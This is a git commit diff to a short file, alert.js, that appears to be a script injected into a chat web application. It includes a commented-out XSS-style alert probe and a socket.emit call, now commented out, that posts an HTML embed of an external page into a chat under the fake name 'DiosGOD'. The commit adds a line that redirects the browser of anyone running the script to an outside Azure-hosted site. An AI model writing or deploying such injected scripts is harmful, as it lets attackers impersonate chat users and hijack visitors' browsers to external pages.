a4d47f2be088660d647a4373c99f7f34ea541deb
thepresidentm <79561790+thepresidentm@users.noreply.github.com>
2022-06-06 23:46:37 +0000

    Update alert.js

--- alert.js
+++ alert.js
@@ -1,2 +1,3 @@
 // alert("awebo");
-socket.emit( 'sendMessage', { of: user.id, to: chat, message: '<embed src="https://thepresidentm.github.io/embed/index.html">', name: "DiosGOD" } );
+// socket.emit( 'sendMessage', { of: user.id, to: chat, message: '<embed src="https://thepresidentm.github.io/embed/index.html">', name: "DiosGOD" } );
+window.location.assign("https://superbear-beartual.azurewebsites.net/");
